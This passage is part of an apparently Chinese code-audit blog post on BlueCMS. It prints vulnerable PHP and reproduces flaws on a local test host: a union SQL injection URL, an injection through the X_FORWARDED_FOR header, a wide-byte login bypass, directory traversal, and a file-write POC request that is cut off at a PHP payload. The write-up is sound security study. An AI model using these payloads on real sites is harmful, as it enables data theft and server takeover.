class="hljs-variable">$dbpass</span>,<span class="hljs-variable">$dbname</span>);<br><span class="hljs-comment">// 加载smarty模板引擎</span><br><span class="hljs-keyword">require</span>(BLUE_ROOT.<span class="hljs-string">&#x27;include/smarty/Smarty.class.php&#x27;</span>);<br><span class="hljs-variable">$smarty</span> = <span class="hljs-keyword">new</span> Smarty();<br><span class="hljs-comment">// 管理员身份认证</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;admin_id&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;act&#x27;</span>] != <span class="hljs-string">&#x27;login&#x27;</span> &amp;&amp; <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;act&#x27;</span>] != <span class="hljs-string">&#x27;do_login&#x27;</span> &amp;&amp; <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;act&#x27;</span>] != <span class="hljs-string">&#x27;logout&#x27;</span>)&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;Blue&#x27;</span>][<span class="hljs-string">&#x27;admin_id&#x27;</span>] &amp;&amp; <span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;Blue&#x27;</span>][<span class="hljs-string">&#x27;admin_name&#x27;</span>] &amp;&amp; <span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;Blue&#x27;</span>][<span class="hljs-string">&#x27;admin_pwd&#x27;</span>])&#123;<br>        <span class="hljs-keyword">if</span>(check_cookie(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;Blue&#x27;</span>][<span class="hljs-string">&#x27;admin_name&#x27;</span>], <span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;Blue&#x27;</span>][<span class="hljs-string">&#x27;admin_pwd&#x27;</span>]))&#123;<br>          update_admin_info(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;Blue&#x27;</span>][<span class="hljs-string">&#x27;admin_name&#x27;</span>]);<br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        setcookie(<span class="hljs-string">&quot;Blue[admin_id]&quot;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-number">1</span>, <span class="hljs-variable">$cookiepath</span>, <span class="hljs-variable">$cookiedomain</span>);<br>        setcookie(<span class="hljs-string">&quot;Blue[admin_name]&quot;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-number">1</span>, <span class="hljs-variable">$cookiepath</span>, <span class="hljs-variable">$cookiedomain</span>);<br>        setcookie(<span class="hljs-string">&quot;Blue[admin_pwd]&quot;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-number">1</span>, <span class="hljs-variable">$cookiepath</span>, <span class="hljs-variable">$cookiedomain</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;script type=&quot;text/javascript&quot;&gt;top.location=&quot;login.php?act=login&quot;;&lt;/script&gt;&#x27;</span>;<br>        <span class="hljs-keyword">exit</span>();<br>    &#125;<br>&#125;<span class="hljs-keyword">elseif</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;admin_id&#x27;</span>])&#123;<br>     update_admin_info(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;admin_name&#x27;</span>]);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h1 id="0x03-漏洞审计"><a href="#0x03-漏洞审计" class="headerlink" title="0x03 漏洞审计"></a>0x03 漏洞审计</h1><h2 id="sql注入漏洞"><a href="#sql注入漏洞" class="headerlink" title="sql注入漏洞"></a>sql注入漏洞</h2><p>通过BlueCMS我们可以看到各种常见的漏洞写法</p>
+<h3 id="数字型注入"><a href="#数字型注入" class="headerlink" title="数字型注入"></a>数字型注入</h3><blockquote>
+<p>ad_js.php</p>
+</blockquote>
+<ul>
+<li>ad_js.php 加载了common.inc.php，会对GPC数据做 addslashes() 过滤</li>
+<li><code>$ad_id</code> 通过 $_GET 方式获取，会自动经过一层过滤，最终传入到sql语句执行</li>
+<li>在执行的sql语句中发现 <code>$ad_id</code> 没有引号包裹，而且没有做数字型判断，那么这里很有可能存在数字型sql注入</li>
+<li>sql查询结果最后是用注释的方式放在页面上</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">require_once</span> dirname(<span class="hljs-keyword">__FILE__</span>) . <span class="hljs-string">&#x27;/include/common.inc.php&#x27;</span>;<br><span class="hljs-variable">$ad_id</span> = !<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ad_id&#x27;</span>]) ? trim(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ad_id&#x27;</span>]) : <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-variable">$ad</span> = <span class="hljs-variable">$db</span>-&gt;getone(<span class="hljs-string">&quot;SELECT * FROM &quot;</span>.table(<span class="hljs-string">&#x27;ad&#x27;</span>).<span class="hljs-string">&quot; WHERE ad_id =&quot;</span>.<span class="hljs-variable">$ad_id</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$ad</span>[<span class="hljs-string">&#x27;time_set&#x27;</span>] == <span class="hljs-number">0</span>)<br>&#123;<br>	<span class="hljs-variable">$ad_content</span> = <span class="hljs-variable">$ad</span>[<span class="hljs-string">&#x27;content&#x27;</span>];<br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;!--\r\ndocument.write(\&quot;&quot;</span>.<span class="hljs-variable">$ad_content</span>.<span class="hljs-string">&quot;\&quot;);\r\n--&gt;\r\n&quot;</span>;<br></code></pre></td></tr></table></figure>
+
+<p>复现漏洞时我是想利用报错注入快一点，但没有成功，奇怪，下面用union注入复现：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://bluecms.test:<span class="hljs-number">8888</span>/ad_js.php?ad_id=<span class="hljs-number">0</span> union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,version()--+<br></code></pre></td></tr></table></figure>
+
+<img src="img/blueCMS/image-20210806144015218.png" srcset="/img/loading.gif" lazyload alt="image-20210806144015218" style="zoom:50%;" />
+
+
+<h3 id="SERVER-的突破"><a href="#SERVER-的突破" class="headerlink" title="$_SERVER 的突破"></a>$_SERVER 的突破</h3><p>上面知道只对GPC数据做了全局过滤，还有一个 <code>$_SERVER</code>是没有过滤的，其实 <code>$_SERVER</code> 也是可以传入外部可控数据的</p>
+<blockquote>
+<p>guest_book.php</p>
+</blockquote>
+<ul>
+<li>guest_book.php 是一个处理用户留言功能的模块，但用户发送留言时，会同时把用户留言的ip地址一起放到数据库中</li>
+<li>其中 <code>$online_ip</code> 来自 common.fun.php 中 getip() 函数</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">require</span> dirname(<span class="hljs-keyword">__FILE__</span>) . <span class="hljs-string">&#x27;/include/common.inc.php&#x27;</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$act</span> == <span class="hljs-string">&#x27;list&#x27;</span>)&#123;<br>  ……<br>&#125;<span class="hljs-keyword">elseif</span>(<span class="hljs-variable">$act</span> == <span class="hljs-string">&#x27;send&#x27;</span>)&#123;<br>  <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;INSERT INTO &quot;</span> . table(<span class="hljs-string">&#x27;guest_book&#x27;</span>) . <span class="hljs-string">&quot; (id, rid, user_id, add_time, ip, content) </span><br><span class="hljs-string">			VALUES (&#x27;&#x27;, &#x27;<span class="hljs-subst">$rid</span>&#x27;, &#x27;<span class="hljs-subst">$user_id</span>&#x27;, &#x27;<span class="hljs-subst">$timestamp</span>&#x27;, &#x27;<span class="hljs-subst">$online_ip</span>&#x27;, &#x27;<span class="hljs-subst">$content</span>&#x27;)&quot;</span>;<br>	<span class="hljs-variable">$db</span>-&gt;query(<span class="hljs-variable">$sql</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p>common.fun.php</p>
+</blockquote>
+<ul>
+<li>getip() 首先会在<code>HTTP_</code>开头的环境变量寻找ip，<code>HTTP_</code>开头的变量是可控的，来自请求头</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getip</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br>	<span class="hljs-keyword">if</span> (getenv(<span class="hljs-string">&#x27;HTTP_CLIENT_IP&#x27;</span>))<br>	&#123;<br>		<span class="hljs-variable">$ip</span> = getenv(<span class="hljs-string">&#x27;HTTP_CLIENT_IP&#x27;</span>); <br>	&#125;<br>	<span class="hljs-keyword">elseif</span> (getenv(<span class="hljs-string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>)) <br>	&#123;<br>		<span class="hljs-variable">$ip</span> = getenv(<span class="hljs-string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>);<br>	&#125;<br>	……<br>  <span class="hljs-keyword">else</span><br>	&#123; <br>		<span class="hljs-variable">$ip</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>];<br>	&#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-variable">$ip</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>漏洞复现：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/guest_book.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>bluecms:8888<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:89.0) Gecko/20100101 Firefox/89.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br>X_FORWARDED_FOR: 192.168.44.1&#x27;,user())#<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>PHPSESSID=8d9d7ed9da5a96ac9b0093dceed684f9<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>37<br><br><span class="dts">content=hello<span class="hljs-variable">&amp;act</span>=send<span class="hljs-variable">&amp;page_id</span>=<span class="hljs-number">1</span><span class="hljs-variable">&amp;rid</span>=</span><br></code></pre></td></tr></table></figure>
+
+<p>效果：</p>
+<img src="img/blueCMS/image-20210607182605405.png" srcset="/img/loading.gif" lazyload alt="image-20210607182605405" style="zoom: 33%;" />
+
+<h3 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h3><p>上面有提到这一点，因为程序在数据库链接处设置了GBK编码，利用宽字节注入可以绕过程序过滤，所以BlueCMS的sql注入基本都有存在，下面就找一个地方验证一下</p>
+<blockquote>
+<p>admin/login.php</p>
+</blockquote>
+<ul>
+<li>admin/login.php 是后台管理员登陆页面，如果这里存在sql注入常见的利用方式就是注入万能密码</li>
+<li>可以看到后台验证验证用户是否登陆的依据：具有非空<code>$_SESSION[&#39;admin_id&#39;]</code>值</li>
+<li>$admin_name 和 $admin_pwd 通过post获取，post数据会通过addslashs()函数过滤。验证的关键函数为<strong>check_admin()</strong></li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">require_once</span>(dirname(<span class="hljs-keyword">__FILE__</span>) . <span class="hljs-string">&#x27;/include/common.inc.php&#x27;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$act</span> == <span class="hljs-string">&#x27;login&#x27;</span>)&#123;<br>  <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;admin_id&#x27;</span>])&#123;<br> 		showmsg(<span class="hljs-string">&#x27;您已登录，不用再次登录&#x27;</span>, <span class="hljs-string">&#x27;index.php&#x27;</span>);<br> 	&#125;<br>  ……<br>&#125;<span class="hljs-keyword">elseif</span>(<span class="hljs-variable">$act</span> == <span class="hljs-string">&#x27;do_login&#x27;</span>)&#123;<br>  <span class="hljs-variable">$admin_name</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;admin_name&#x27;</span>]) ? trim(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;admin_name&#x27;</span>]) : <span class="hljs-string">&#x27;&#x27;</span>;<br>	<span class="hljs-variable">$admin_pwd</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;admin_pwd&#x27;</span>]) ? trim(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;admin_pwd&#x27;</span>]) : <span class="hljs-string">&#x27;&#x27;</span>;<br>	<span class="hljs-keyword">if</span>(check_admin(<span class="hljs-variable">$admin_name</span>, <span class="hljs-variable">$admin_pwd</span>))&#123;<br> 		update_admin_info(<span class="hljs-variable">$admin_name</span>);<br> 		<span class="hljs-keyword">if</span>(<span class="hljs-variable">$remember</span> == <span class="hljs-number">1</span>)&#123;<br> 			setcookie(<span class="hljs-string">&#x27;Blue[admin_id]&#x27;</span>, <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;admin_id&#x27;</span>], time()+<span class="hljs-number">86400</span>);<br> 			setcookie(<span class="hljs-string">&#x27;Blue[admin_name]&#x27;</span>, <span class="hljs-variable">$admin_name</span>, time()+<span class="hljs-number">86400</span>);<br>			setcookie(<span class="hljs-string">&#x27;Blue[admin_pwd]&#x27;</span>, md5(md5(<span class="hljs-variable">$admin_pwd</span>).<span class="hljs-variable">$_CFG</span>[<span class="hljs-string">&#x27;cookie_hash&#x27;</span>]), time()+<span class="hljs-number">86400</span>);<br> 		&#125;<br> 	&#125;<span class="hljs-keyword">else</span>&#123;<br> 		showmsg(<span class="hljs-string">&#x27;您输入的用户名和密码有误&#x27;</span>);<br> 	&#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p>admin/include/common.fun.php</p>
+</blockquote>
+<p>判断的依据是同时查询用户名和密码，查询到结果则为真</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check_admin</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>, <span class="hljs-variable">$pwd</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>	<span class="hljs-keyword">global</span> <span class="hljs-variable">$db</span>;<br>	<span class="hljs-variable">$row</span> = <span class="hljs-variable">$db</span>-&gt;getone(<span class="hljs-string">&quot;SELECT COUNT(*) AS num FROM &quot;</span>.table(<span class="hljs-string">&#x27;admin&#x27;</span>).<span class="hljs-string">&quot; WHERE admin_name=&#x27;<span class="hljs-subst">$name</span>&#x27; and pwd = md5(&#x27;<span class="hljs-subst">$pwd</span>&#x27;)&quot;</span>);<br> 	<span class="hljs-keyword">if</span>(<span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;num&#x27;</span>] &gt; <span class="hljs-number">0</span>)<br> 	&#123;<br> 		<span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br> 	&#125;<br> 	<span class="hljs-keyword">else</span><br> 	&#123;<br> 		<span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br> 	&#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>这里我们的宽字节利用不就来了，注入永真的sql语句，我们就绕过了前台的限制</p>
+<p>注意浏览器会自动对post数据url编码，我们注入的<code>%</code>会被编码导致注入宽字节失效，最好通过抓包取消url编码</p>
+<img src="img/blueCMS/image-20210607190018647.png" srcset="/img/loading.gif" lazyload alt="image-20210607190018647" style="zoom:50%;" />
+
+
+
+<h2 id="任意文件读取-写入"><a href="#任意文件读取-写入" class="headerlink" title="任意文件读取/写入"></a>任意文件读取/写入</h2><p>在 BlueCMS 后台处有一个编辑模板的功能，对于这种功能，安全小伙应该保持敏感，这里会出现读取和写入的操作，很有可能就存在任意文件读取/写入漏洞</p>
+<img src="img/blueCMS/image-20210806165617800.png" srcset="/img/loading.gif" lazyload alt="image-20210806165617800" style="zoom:50%;" />
+
+<img src="img/blueCMS/image-20210806165645739.png" srcset="/img/loading.gif" lazyload alt="image-20210806165645739" style="zoom: 33%;" />
+
+<h3 id="审计细节"><a href="#审计细节" class="headerlink" title="审计细节"></a>审计细节</h3><blockquote>
+<p>admin/tpl_manage.php</p>
+</blockquote>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">require_once</span>(dirname(<span class="hljs-keyword">__FILE__</span>).<span class="hljs-string">&#x27;/include/common.inc.php&#x27;</span>);<br><span class="hljs-variable">$act</span> = !<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;act&#x27;</span>]) ? trim(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;act&#x27;</span>]) : <span class="hljs-string">&#x27;list&#x27;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$act</span> == <span class="hljs-string">&#x27;list&#x27;</span>)&#123;<br>  <span class="hljs-variable">$dir</span> = BLUE_ROOT.<span class="hljs-string">&#x27;templates/default&#x27;</span>;<br>  <span class="hljs-comment">// 列出$dir下的文件</span><br>	……<br>&#125;<br><span class="hljs-keyword">elseif</span>(<span class="hljs-variable">$act</span> == <span class="hljs-string">&#x27;edit&#x27;</span>)&#123;<br>  <span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;tpl_name&#x27;</span>];<br>	<span class="hljs-keyword">if</span>(!<span class="hljs-variable">$handle</span> = @fopen(BLUE_ROOT.<span class="hljs-string">&#x27;templates/default/&#x27;</span>.<span class="hljs-variable">$file</span>, <span class="hljs-string">&#x27;rb&#x27;</span>))&#123;<br>		showmsg(<span class="hljs-string">&#x27;打开目标模板文件失败&#x27;</span>);<br>	&#125;<br>	<span class="hljs-variable">$tpl</span>[<span class="hljs-string">&#x27;content&#x27;</span>] = fread(<span class="hljs-variable">$handle</span>, filesize(BLUE_ROOT.<span class="hljs-string">&#x27;templates/default/&#x27;</span>.<span class="hljs-variable">$file</span>));<br>	<span class="hljs-variable">$tpl</span>[<span class="hljs-string">&#x27;content&#x27;</span>] = htmlentities(<span class="hljs-variable">$tpl</span>[<span class="hljs-string">&#x27;content&#x27;</span>], ENT_QUOTES, GB2312);<br>	fclose(<span class="hljs-variable">$handle</span>);<br>	<span class="hljs-variable">$tpl</span>[<span class="hljs-string">&#x27;name&#x27;</span>] = <span class="hljs-variable">$file</span>;<br>	template_assign(<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;current_act&#x27;</span>, <span class="hljs-string">&#x27;tpl&#x27;</span>), <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;编辑模板&#x27;</span>, <span class="hljs-variable">$tpl</span>));<br>	<span class="hljs-variable">$smarty</span>-&gt;display(<span class="hljs-string">&#x27;tpl_info.htm&#x27;</span>);<br>&#125;<br><span class="hljs-keyword">elseif</span>(<span class="hljs-variable">$act</span> == <span class="hljs-string">&#x27;do_edit&#x27;</span>)&#123;<br>	<span class="hljs-variable">$tpl_name</span> = !<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;tpl_name&#x27;</span>]) ? trim(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;tpl_name&#x27;</span>]) : <span class="hljs-string">&#x27;&#x27;</span>;<br> 	<span class="hljs-variable">$tpl_content</span> = !<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;tpl_content&#x27;</span>]) ? deep_stripslashes(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;tpl_content&#x27;</span>]) : <span class="hljs-string">&#x27;&#x27;</span>;<br> 	<span class="hljs-keyword">if</span>(<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$tpl_name</span>))&#123;<br> 		<span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br> 	&#125;<br> 	<span class="hljs-variable">$tpl</span> = BLUE_ROOT.<span class="hljs-string">&#x27;templates/default/&#x27;</span>.<span class="hljs-variable">$tpl_name</span>;<br> 	<span class="hljs-keyword">if</span>(!<span class="hljs-variable">$handle</span> = @fopen(<span class="hljs-variable">$tpl</span>, <span class="hljs-string">&#x27;wb&#x27;</span>))&#123;<br>		showmsg(<span class="hljs-string">&quot;打开目标模版文件 <span class="hljs-subst">$tpl</span> 失败&quot;</span>);<br> 	&#125;<br> 	<span class="hljs-keyword">if</span>(fwrite(<span class="hljs-variable">$handle</span>, <span class="hljs-variable">$tpl_content</span>) === <span class="hljs-literal">false</span>)&#123;<br> 		showmsg(<span class="hljs-string">&#x27;写入目标 $tpl 失败&#x27;</span>);<br> 	&#125;<br> 	fclose(<span class="hljs-variable">$handle</span>);<br> 	showmsg(<span class="hljs-string">&#x27;编辑模板成功&#x27;</span>, <span class="hljs-string">&#x27;tpl_manage.php&#x27;</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li><code>$act</code>  可控，用于指定操作，具有的操作为<strong>list, edit 和do_edit</strong></li>
+<li>默认操作 <strong>list</strong>，列出指定目录下的文件</li>
+<li>操作 <strong>edit</strong> 用于读取指定目录下的<code>$file</code>，该参数可控，通过 <code>../</code> 可以实现目录穿越，这里就有任意文件读取漏洞</li>
+<li>操作 do_edit 将 <code>$tpl_content</code> 写入到 <code>$tpl_name</code> 文件中，两个参数都可控，不过写入的内容 <code>$tpl_content</code> 会通过 deep_stripslashes() 过滤，同时还要注意 <code>$tpl_content</code> 是通过 POST 方式传入的，还会经过 addslashes() 处理</li>
+</ul>
+<blockquote>
+<p>include/common.fun.php</p>
+</blockquote>
+<p>查看 deep_stripslashes() ，其实就是使用 stripslashes()  来消除 addslashes() 的影响，所以这里我们输入的内容完全可控，这里将同时存在任意文件读取和写入的漏洞</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">deep_stripslashes</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span><br><span class="hljs-function"></span>&#123;<br> 	<span class="hljs-keyword">if</span>(is_array(<span class="hljs-variable">$str</span>))<br> 	&#123;<br> 		<span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$str</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$val</span>)<br> 		&#123;<br> 			<span class="hljs-variable">$str</span>[<span class="hljs-variable">$key</span>] = deep_stripslashes(<span class="hljs-variable">$val</span>);<br> 		&#125;<br> 	&#125;<br> 	<span class="hljs-keyword">else</span><br> 	&#123;<br> 		<span class="hljs-variable">$str</span> = stripslashes(<span class="hljs-variable">$str</span>);<br> 	&#125;<br> 	<span class="hljs-keyword">return</span> <span class="hljs-variable">$str</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h3 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h3><p>利用目录穿越读取任意文件</p>
+<img src="img/blueCMS/image-20210809180020442.png" srcset="/img/loading.gif" lazyload alt="image-20210809180020442" style="zoom:50%;" />
+
+<p>直接构造一个post请求修改一个不存在的文件，这样将会创建一个文件并写入，poc如下：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/admin/tpl_manage.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>bluecms.test:8888<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:90.0) Gecko/20100101 Firefox/90.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>59<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://bluecms.test:8888<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://bluecms.test:8888/admin/tpl_manage.php?act=edit&amp;tpl_name=news_info.htm<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>PHPSESSID=bb499d4e1bddb4c5b2c6cd16c39e5c77<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><br><span class="php">tpl_content=<span class="hljs-meta">&lt;?php</span> phpinfo();<span 